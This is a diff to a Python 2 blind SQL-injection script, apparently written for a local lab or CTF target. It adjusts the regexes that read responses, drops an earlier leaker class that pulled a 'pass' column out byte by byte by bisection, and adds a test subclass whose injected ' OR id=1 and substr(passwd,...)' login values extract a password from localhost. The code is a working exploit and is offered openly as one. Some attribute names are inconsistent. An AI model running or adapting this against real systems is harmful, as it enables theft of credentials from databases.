@@ -21,9 +21,9 @@ class SQLIBlindParser(Parser):
         ERROR = 2
 
     PATTERNS = [
-        (Result.OK,    r"</table><p>You can't access information about (.+?)</p><p>Page :"),
-        (Result.FAIL,  r"</table><p>You can't access information about </p><p>Page :"),
-        (Result.ERROR, r'</table><p>Page :'),
+        (Result.OK,    r'''<h2></h2>'''),
+        (Result.FAIL,  r'''<h2>no such user</h2>'''),
+        (Result.ERROR, r'SQL error :'),
     ]
 
     def get_patterns(self):
@@ -42,85 +42,6 @@ class SQLIBlindParser(Parser):
             return (result, finding[0])
 
         raise UnexpectedPattern('%s is not recognized by %s' % (data, self.PATTERNS))
-
-class SQLILeaker(Leaker):
-    '''
-    Leaker that exfiltrate data from a database using a boolean blind sqli.
-    '''
-    def __init__(self, url, params=None, cookies=None, **kwargs):
-        super(SQLILeaker, self).__init__(**kwargs)
-        self.url = url
-        self.params = params or {}
-        self.cookies = cookies or {}
-
-        #
-        self.query_fmt = '1 and substr(pass,%d,1)>=CHAR(%d)'
-
-        self.values = []
-        self.substr_index = 1
-
-        self.cmp_value = 2**7 # value used to inference
-        self.value     = 0    # value exfiltered until now
-        self.idx       = 7    # we will decrease until 0 to bisect
-
-        self.update_params(None)
-
-    def get_rng(self):
-        return 2**self.idx
-
-    def input(self):
-        logger.debug('params: %s' % self.params)
-
-        response = requests.get(self.url, params=self.params, cookies=self.cookies)
-
-        logger.debug('input(): %s' % response.text)
-
-        return response.text
-
-    def update_params(self, leak):
-        self.params.update({
-            'uid': self.query_fmt % (self.substr_index, self.cmp_value),
-        })
-
-    def update(self, leak):
-        result, data = leak
-
-        logger.debug('result: %s' % result)
-
-        if result == SQLIBlindParser.Result.OK:
-            self.value += self.get_rng()
-        elif result == SQLIBlindParser.Result.ERROR:
-            raise AttributeError('dove cazzo andiamo')
-
-        if self.idx == 0:
-            if self.value == 0:
-                raise LeakerEOS('FIXME: end of string?')
-
-            # we have retrieved one bytes
-            self.values.append(chr(self.value))
-            self.substr_index += 1
-
-            logger.info('New byte retrieved: %d' % self.value)
-            logger.info(' values: %s' % self.values)
-
-            # pass to the next
-            self.value = 0
-            self.cmp_value = 2**7
-            self.idx = 7
-        else:
-            self.idx -= 1
-
-            self.cmp_value = self.value + self.get_rng()
-
-        self.update_params(leak)
-
-        return result
-
-    def output(self, leak_piece):
-        pass
-
-    def on_exit(self):
-        print 'value: %s' % ''.join(self.values)
 
 def dicotomia(guess):
     value = 0
@@ -247,5 +168,22 @@ class SQLILeaker(Leaker):
     def on_exit(self):
         print 'value: %s' % ''.join(self.values)
 
+class SQLITest(SQLILeaker):
+    url    = 'http://localhost:8080'
+    method = 'post'
+    query  = ' OR id=1 and substr(passwd,%d,1)>=char(%d)#'
+    query_length = ' OR id=1 and length(passwd)>=%d#'
+    data = {'login': None, 'pass': '/var/games/gnibbles.1.1.scores'}
+    parser = SQLIBlindParser()
+
+    def update_params(self, leak):
+        self.data.update({
+            'pass': '/var/games/gnibbles.1.1.scores', # FIXME: pass in the class body declaration
+            'login': self.query_length_fmt % self.cmp_value if self.is_determine_length else self.query_fmt % (self.substr_index, self.cmp_value),
+        })
+
 if __name__ == '__main__':
-    logging.basicConfig(level=logging.DEBUG)
+    logging.basicConfig(level=logging.INFO)
+
+    leaker = SQLITest()
+    leaker()
